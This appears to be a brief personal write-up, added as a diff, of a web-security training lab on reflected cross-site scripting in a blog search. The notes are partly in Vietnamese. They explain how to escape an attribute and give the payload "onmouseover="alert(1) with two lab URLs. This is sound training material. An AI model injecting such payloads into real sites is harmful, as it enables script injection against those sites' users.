@@ -1,0 +1,8 @@
+This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.
+
+Thêm một dấu " để escape sau dó chèn event onmouseover vào
+
+payload: "onmouseover="alert(1)
+
+https://0a98006a03c722fbc0f333c1001f0002.web-security-academy.net/?search=%22onmouseover=%22alert(1)
+https://0a98006a03c722fbc0f333c1001f0002.web-security-academy.net/?search=%22onclick=%22alert(1)
